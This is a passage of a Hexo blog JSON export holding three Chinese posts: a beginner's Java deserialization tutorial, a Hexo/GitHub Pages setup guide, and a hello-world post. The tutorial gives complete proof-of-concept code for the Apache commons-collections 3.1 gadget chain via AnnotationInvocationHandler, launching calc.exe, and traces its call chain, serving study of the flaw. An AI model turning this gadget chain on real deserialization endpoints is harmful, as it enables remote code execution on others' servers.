反序列化","slug":"初识Java反序列化","date":"2020-08-16T13:31:50.000Z","updated":"2020-09-22T14:51:20.769Z","comments":true,"path":"2020/08/16/初识Java反序列化/","link":"","permalink":"http://yoursite.com/2020/08/16/%E5%88%9D%E8%AF%86Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"初识Java 反序列化 What 什么是序列化与反序列化 java 序列化可以将一个对象序列化成JVM认识的字节序列，字节序列中包含了对象的数据，主要以对象属性为主。 java 反序列化是指把字节序列恢复为java对象的过程。利用在A平台上序列化产生的字节序列，可以在B平台上反序列化出同样的对象。","text":"初识Java 反序列化 What 什么是序列化与反序列化 java 序列化可以将一个对象序列化成JVM认识的字节序列，字节序列中包含了对象的数据，主要以对象属性为主。 java 反序列化是指把字节序列恢复为java对象的过程。利用在A平台上序列化产生的字节序列，可以在B平台上反序列化出同样的对象。 Why 为什么要用序列化与反序列化 实现了数据的持久化，通过序列化可以把数据永久的保存在硬盘上。 利用序列化实现远程通信，即在网络上传送对象的字节序列。 How 如何实现序列化与反序列化 JDK类库中序列化API 使用到JDK中关键类 ObjectOutputStream(对象输出流) 和ObjectInputStream(对象输入流) ObjectOutputStream 类中：通过使用 writeObject(Object object) 方法，将对象以二进制格式进行写入。 ObjectInputStream 类中：通过使用 readObject（）方法，从输入流中读取二进制流，转换成对象。 序列化一个对象 被序列化的类必须要实现 Serializable 接口，否则将无法序列化对象。 1234public class User implements Serializable { public String name; public int age;} 12345678910111213141516public class Main { public static void main(String[] args) throws IOException { User user =new User(); user.age = 18; user.name = \"whippet\"; PrintStream out = System.out; ObjectOutputStream objectOutputStream = new ObjectOutputStream(out); objectOutputStream.writeObject(user); objectOutputStream.flush(); objectOutputStream.close(); }} 序列化对象时使用对象输出流”ObjectOutputStream”，往指定输出流里写入 User 对象，使用控制台，可以直观的看到对象序列化后的样子。 �� \u0005sr Simple.User��Gm|\u0007X\u001d\u0002 \u0002I \u0003ageL \u0004namet \u0012Ljava/lang/String;xp \u0012t \u0007whippet 反序列化对象 将对象序列化成byte数组。再用”ObjectInputStream”反序列化回来。 12345678910111213141516171819202122232425262728public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { User user =new User(); user.age = 18; user.name = \"whippet\"; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(user);//序列化对象 objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流 ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); //将byte数组输入流反序列化 System.out.println(o); }} 输出这个反序列化后的对象，和一开始为 User 对象设定的属性值完全相同。同时Java为我们提供了自定义writeObject()、readObject()方法的功能，我们在目标类中自定义writeObject()、readObject()方法之后，将会首先调用我们自定义的方法，然后在继续执行原有的方法步骤. 1234567891011121314151617181920public class User implements Serializable { public String name; public int age; @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException { Runtime.getRuntime().exec(\"calc\"); }} User 类写一个 readObject 方法上去，当对象被反序列化的时候，该方法就会被调用。 序列化时仅能序列化对象的属性，并不能控制方法中的reObject的代码，所有漏洞的构造需要引入新的jar包 commons-collections-3.1反序列化漏洞 漏洞利用 利用maven 安装依赖 12345678&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Pocexec { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\"); }} 漏洞分析 java.lang.Runtime#exec(java.lang.String)在exec处添加断点 查看调用链 最终遍历了”outerMap”这个Map对象的 Entry 集合，然后执行了 Entry 对象的的 setValue 方法导致执行了反射链。所以先查看 outerMap 的实现类 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 调用了方法org.apache.commons.collections.map.TransformedMap#decorate这个静态方法又去new了一个TransformedMap对象。map传入的是一个普通的数据，valueTransformer则是构造的调用链。org.apache.commons.collections.map.TransformedMap#TransformedMap实例化对象成功后依次调用了四个方法 entrySet() iterator() next() setValue() 在类 TransformedMap中未找到定义的 entrySet()方法，在他的父类AbstractInputCheckedMapDecorator 中找org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#entrySetnew 了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetEntrySet类中的iterator方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iterator又new了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIteratorEntrySetIterator类中的next方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#next又new了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntryMapEntry类中的setValue方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue第一行调用了checkSetValue方法，此处的parent来自所以实际上调用为 org.apache.commons.collections.map.TransformedMap#checkSetValue调用了valueTransformer 的transform方法所以首先调用了org.apache.commons.collections.functors.ChainedTransformer#transform循环调用数组每一个对象的transform方法，并传入object对象，再将执行结果赋值给object对象[0]是ConstantTransformer对象，它会返回new时候的参数中的Object对象，这里也是就是”java.Runtime”[1]-[3]是InvokerTransformer对象，调用的是反射的代码 iTransformers的值是在初始化构建ChainedTransformer时生成org.apache.commons.collections.functors.ChainedTransformer#ChainedTransformerConstantTransformer类中实现transform方法org.apache.commons.collections.functors.ConstantTransformer#transformInvokerTransformer类中实现了transform方法org.apache.commons.collections.functors.InvokerTransformer#transform 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } (“getMethod”, new Class[] {String.class, Class[].class }, new Object[] {“getRuntime”, new Class[0] })iMethodName = “getMethod”;iParamTypes = new Class[] {String.class, Class[].class } ;iArgs = new Object[] {“getRuntime”, new Class[0] } 123456789101112public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } ......} 第一个参数”getMethod”是这个函数的名字 第二个参数new Class[]{String.class, Class[].class}是getMethod的2个参数参数类型，一个是String，一个是class[] 第三个参数new Object[]{“getRuntime”, new Class[0]}是getMethod的2个参数值，一个是getRuntime，一个是空，因为是数组形式所以要这么写 getMethod(&lt;String&gt; “getRuntime”, &lt;Class[]&gt; null)invoke(&lt;Object&gt;null, &lt;Object[]&gt;null)exec(&lt;String&gt;“”calc.exe””) 就是通过反射去调用Runtime.getRuntime().exec(“calc.exe”) Java反射机制 java中执行系统命令的方法为 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime.getRuntime().exec(\"calc\"); }} 正常的执行步骤为 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime runtime = Runtime.getRuntime(); runtime.exec(\"calc\"); } } 相对应的反射代码为 123456public class Exec { public static void main(String[] args)throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); }} Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法。该方法的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。 getMethod(方法名, 方法类型)Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null);等价于Object runtime = java.lang.Runtime.getRuntime() person.getClass().getMethod(“Speak”, null);获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null person.getClass().getMethod(“run”, String.class);获得person对象的run方法，因为run方法的形参是String类型的，所以parameterTypes为String.class Method Class.invoke(Object obj, Object… args)invoke(某个对象实例， 传入参数) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\");等价于 runtime.exec(\"calc\");调用生成的runtime实例的exec方法，并将”clac”参数传入exec()方法 实际利用 对象是可以被反序列化，但并不在反序列化时触发调用链，而是要经过迭代器迭代并且使用 setValue() 方法才行，正常情况下基本不会有这种场景。 sun.reflect.annotation.AnnotationInvocationHandler该类中重写了readObject方法,在被调用时会执行setValue操作, 如果能把TransformedMap装入这个AnnotationInvocationHandler类就可以实现任意代码执行 利用代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class AExec implements Serializable { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"value\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(java.lang.annotation.Target.class, transformedMap); //Object instance = ctor.newInstance(java.lang.annotation.Retention.class, transformedMap); //序列化 FileOutputStream fileOutputStream = new FileOutputStream(\"serialize3.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(instance); objectOutputStream.close(); //反序列化 FileInputStream fileInputStream = new FileInputStream(\"serialize3.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); }} java.lang.Runtime#exec(java.lang.String)在exec处添加断点 查看调用链 sun.reflect.annotation.AnnotationInvocationHandler#readObject 传入的第一个参数 var1 必须为继承Annotation的子类，Annotation这个接口是所有注解类型的公用接口，所有注解类型都实现了这个接口。 java.lang.annotation.Retention.class java.lang.annotation.Target.class 否则在这个地方就return，不会继续向下执行了 传入的第二个参数 var2 则是构造的调用链同时map的键值必须为\"value\"，否则利用不成功，这是一处小细节~ Java 反序列化漏洞始末（1）— Apache Commons浅显易懂的JAVA反序列化入门手把手教你写JAVA反序列化的POC document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hexo搭建个人博客","slug":"Hexo搭建个人博客","date":"2020-08-15T15:54:00.000Z","updated":"2020-09-22T14:51:20.768Z","comments":true,"path":"2020/08/15/Hexo搭建个人博客/","link":"","permalink":"http://yoursite.com/2020/08/15/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"搭建博客 环境搭建 安装 Git &amp;&amp; Node.js GitNode.js","text":"搭建博客 环境搭建 安装 Git &amp;&amp; Node.js GitNode.js 安装 Hexo Git 和 Node.js 安装好之后，首先创建一个用于存放博客文件的文件夹，进入文件夹后，安装并使用 Hexo 。 12$ npm install -g hexo-cli$ hexo init 安装完成之后，文件夹的目录如下： |——node_modules|——public|——scaffolds|——source|——themes|——_config.yml|——.gitignore|——db.json|——package.json|——package-lock.json 生成静态博客文件 在 Git Bash 终端执行命令： 12$ hexo g # 生成$ hexo s # 启动服务 在浏览器中访问 http://localhost:4000/ 将博客部署到 Github 上 创建仓库 创建一个名为你用户名.github.io的仓库，(必须是用户名，其他名称无效),以后的访问地址就是 http://用户名.github.io 配置 SSH 密钥 查看本机是否存在 .ssh 目录 1$ cd ~/.ssh 如果不存在，则创建一对新的 SSH 密钥 123$ssh-keygen -t rsa -C \"your_email@example.com\" # 这将按照你提供的邮箱地址，创建一对密钥Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter] 根据提示到输入密码和确认密码 12Enter passphrase (empty for no passphrase): [Type a passphrase]Enter same passphrase again: [Type passphrase again] 生成 SSH 之后 运行如下命令，将公钥的内容复制到系统粘贴板(clipboard)中： 1clip &lt; ~/.ssh/id_rsa.pub 粘贴公钥到 github –&gt; Settings –&gt; SSH keys 进行测试，看是否设置成功 1$ ssh -T git@github.com 设置用户信息 Git 会根据用户的名字和邮箱来记录提交，GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替。 123$ git config --global user.name \"Whippet\" #用户名$ git config --global user.email \"Whippet0@qq.com\" #邮箱$ git config --list #查看用户信息 本地的 Hexo 文件 更新到 Github 登陆 Github 找到地址https://github.com/Whippet0/Whippet0.github.io.git 复制至 hexo 安装目录下的 _config.yml 文件中 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/Whippet0/Whippet0.github.io.git branch: master 在 hexo 文件夹下执行 1234$ hexo g$ hexo d或者$ hexo g -d 如果 hexo d 的时候报错 ERROR Deployer not found: git执行 npm install hexo-deployer-git --save 然后需要输入 github 的账号和密码 成功之后访问 https://whippet0.github.io/ 美化博客 进入 hexo 主题官网挑选我们喜欢的主题，复制主题的地址https://github.com/Molunerfinn/hexo-theme-melody打开Hexo文件夹 按照 github 上的提示进行操作 若没有提示则直接 git clone 该文件夹。下载完成后，打开Hexo文件夹下的配置文件_config.yml 修改参数为：theme: melody 在 Git Bash 终端执行命令： 12$ hexo g # 生成$ hexo s # 启动服务 在浏览器中访问 http://localhost:4000/在本地进行查看 部署主题到github 上 12hexo clean (必须要，不然有时因为缓存问题，服务器更新不了主题)hexo g -d 最后我选择了这个主题 stun 因为有配套的中文说明，所以配置起来很方便。 同时也可以让博客上添加一些 Emoji 👴 发布文章 图片配置 在根目录下配置文件_config.yml 中 post_asset_folder: true安装插件 1$ npm install https://github.com/CodeFalling/hexo-asset-image -- save 利用 hexo n \"文章名称\" 在 source\\_posts下生成一个新的文章时，同时也会生成一个文章名称的文件夹，把图片放在文章名称文件夹下，在 markdown 中利用图片时是需要加上文件夹的目录，但是上传至 github 时 并不需要文件夹的目录。然后就利用 Oah 的脚本，轻松解决了这个问题。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-08-15T13:31:50.000Z","updated":"2020-09-22T14:51:20.768Z","comments":true,"path":"2020/08/15/hello-world/","link":"","permalink":"http://yoursite.com/2020/08/15/hello-world/","excerpt":"","text":"Hello word 😄 😄 😄 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[],"tags":[]}